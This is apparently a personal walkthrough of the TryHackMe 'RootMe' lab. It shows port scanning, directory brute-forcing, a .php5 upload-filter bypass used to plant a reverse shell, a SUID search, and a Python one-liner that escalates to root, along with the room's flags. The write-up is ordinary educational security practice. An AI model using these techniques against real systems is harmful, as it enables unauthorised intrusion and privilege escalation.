> Sun 3 Aug 2025
> al3xx

![[s9.png|350]]
# RootMe [Link](https://tryhackme.com/room/rrootme)

## 1. Reconnaissance
### TCP Scan
```bash
sudo nmap -sC -sV -T4 10.10.155.21 -oN nmap/rootMe.txt
```

**Open ports**

| port | service | version                         |
| ---- | ------- | ------------------------------- |
| 22   | ssh     | OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 |
| 80   | http    | Apache httpd 2.4.29 ((Ubuntu))  |

## 2. Enumeration
### 1. Web Enumeration
- Port **80** is open.
- Visiting the website initially showed nothing interesting.
- Used **Gobuster** to find hidden directories:
```bash
gobuster dir -u 10.10.155.21 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 40 2>/dev/null
```

result:
```TEXT
/uploads
/css
/js
/panel
```

## 3. Exploitation
- Found a **file upload vulnerability** in the `/panel` route.
- The upload blocks files ending with `.php`.
- Bypassed this by uploading files with `.php5` extension.
- After uploading the reverse shell, accessed it via the `/uploads` directory to get a shell.

## 4. Post-Exploitation
After getting shell access, searched for `user.txt` and found the user flag:
```TEXT
THM{y0u_g0t_a_sh3ll}
```
located at `/var/www/user.txt`.

Checked for SUID files with:
```bash
find / -type f -perm -04000 -ls 2>/dev/null
```

Found an interesting SUID file:
```bash
266770   3580 -rwsr-sr-x   1 root root 3665768 Aug 4 2020 /usr/bin/python
```

## 5. Privilege Escalation
Since `/usr/bin/python` runs as root with SUID, used it to spawn a root shell:
```bash
/usr/bin/python -c 'import os; os.setuid(0); os.setgid(0); os.system("/bin/bash")'
```

After gaining root, searched for `root.txt` and found the root flag:
```TEXT
THM{pr1v1l3g3_3sc4l4t10n}
```
located at `/root/root.txt`.